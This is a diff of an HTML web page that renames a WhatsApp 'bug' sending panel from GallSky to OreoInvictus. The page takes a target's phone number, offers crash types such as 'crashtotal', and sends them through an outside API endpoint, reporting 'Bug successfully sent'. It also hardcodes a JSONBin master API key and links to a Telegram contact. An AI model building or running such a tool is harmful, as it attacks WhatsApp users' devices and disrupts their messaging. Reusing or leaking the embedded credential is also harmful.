@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>GallSkyWeb</title>
+  <title>OreoInvictusWeb</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
   <style>
@@ -160,13 +160,13 @@
 
 <div class="glass-box" id="main-box" style="display:none;">
   <div class="profile">
-    <img src="https://files.catbox.moe/5gmcmz.jpg" alt="profile">
+    <img src="https://files.catbox.moe/5ymj6a.jpg" alt="profile">
     <div class="profile-info">
       <h2 id="userLabel">Api Bug</h2>
       <span class="status"><i class="fas fa-circle"></i> Connected</span>
     </div>
   </div>
-  <h1 class="neon"><i class="fab fa-whatsapp"></i> GallSky</h1>
+  <h1 class="neon"><i class="fab fa-whatsapp"></i> OreoInvictus</h1>
   <input type="text" id="target" placeholder="628xxxx" />
 <div class="bug-options">
   <div class="bug-card active" data-bug="crashtotal">
@@ -188,7 +188,7 @@
   <div class="contact" style="margin-top: 20px; color: white;">
     <p>Contact Developer:</p>
     <a href="https://t.me/leakvjs" target="_blank" style="color: #00acee; text-decoration: none;">
-      <i class="fab fa-telegram"></i> @GallSky
+      <i class="fab fa-telegram"></i> @OreoInvictus
     </a>
   </div>
 </div>
@@ -218,8 +218,8 @@ particlesJS("particles-js", {
   retina_detect: true
 });
 
-const BIN_ID = "68675dc58960c979a5b6d052";
-const API_KEY = "$2a$10$yYSEfr4ItL9KOQLriedcOu3sNd23Yp.ca9ftsyuBnYGo4IIwS7pAm";
+const BIN_ID = "6868f7528561e97a5031e200";
+const API_KEY = "$2a$10$rkXT9oiDY9uJlbyTmCZgbe0lL48yKuSs7N78lreDIhGds/EghIhYa";
 const headers = {
   "Content-Type": "application/json",
   "X-Master-Key": API_KEY
@@ -310,7 +310,7 @@ try {
   const res = await fetch(`https://cella-why.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
   const json = await res.json();
 
-  showPopup(`GallSky Bug successfully sent to <b>${input}</b>`);
+  showPopup(`OreoInvictus Bug successfully sent to <b>${input}</b>`);
 } catch (err) {
   resDiv.innerText = "❌ Gagal fetch: " + err;
   resDiv.style.color = "crimson";
@@ -321,4 +321,4 @@ try {
 }
 </script>
 </body>
-  </html>
+</html>
